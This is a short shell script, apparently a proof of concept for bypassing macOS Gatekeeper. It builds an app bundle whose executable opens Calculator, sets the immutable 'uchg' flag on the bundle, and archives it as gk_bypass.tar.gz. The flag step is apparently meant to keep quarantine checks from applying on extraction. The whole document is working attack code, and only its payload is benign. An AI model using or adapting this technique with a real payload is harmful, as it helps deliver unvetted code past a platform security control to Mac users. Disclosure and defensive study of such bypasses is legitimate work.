#!/bin/sh

mkdir -p "gk_bypass/PoC.app/Contents/MacOS"

echo "#!/bin/bash" > "gk_bypass/PoC.app/Contents/MacOS/PoC"
echo "open -a Calculator" >> "gk_bypass/PoC.app/Contents/MacOS/PoC"
chmod +x "gk_bypass/PoC.app/Contents/MacOS/PoC"

chflags uchg "gk_bypass/PoC.app"

tar czvf gk_bypass.tar.gz gk_bypass
